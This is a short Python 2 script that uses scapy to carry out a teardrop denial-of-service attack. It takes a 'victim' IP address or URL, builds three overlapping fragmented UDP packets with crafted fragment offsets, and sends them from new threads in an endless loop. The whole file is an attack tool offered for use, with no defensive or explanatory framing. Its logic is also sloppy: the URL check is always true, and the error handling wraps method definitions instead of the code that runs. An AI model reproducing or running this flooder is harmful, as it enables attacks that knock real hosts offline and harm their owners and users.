#!/usr/bin/env python
#author Aiden

from scapy.all import *
import socket, sys,re ,threading

if len(sys.argv) != 2:
	print "Usage: teardrop.py <target>"
	sys.exit(1) 
victim = sys.argv[1]
sys.tracebacklimit=0

class teardrop(threading.Thread):
	try:
		def check(self):
			global target,victim
			rep = victim.replace('.','')
			check = rep.isdigit()
			if check == True:
				target = victim 
			elif check == False and 'http'or'https' in victim:
				if victim.count("/")==2:
					victim = victim + "/"
				m = re.search('(https?\://)?([^/]*)/?.*', victim)
				host = m.group(2)
				target = socket.gethostbyname(host)
		def drop(self):
			self.check()
			print target
			size = 1400
			offset1 = 120
			offset2 = 350
			load = "X" * size

			i = IP()
			i.dst = target
			i.flags = "MF"
			i.proto = 17 

			j = IP()
			j.dst= target
			j.flags = "MF"
			j.proto = 17
			j.frag = offset1

			k = IP()
			k.dst = target
			k.flags = 0
			k.proto = 17 
			k.frag = offset2

			send(i/load)
			send(j/load)
			send(k/load)
	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print 'Victim not available or there is some error with your IP!'
		sys.exit(1)


while True:
	teardrop().start()
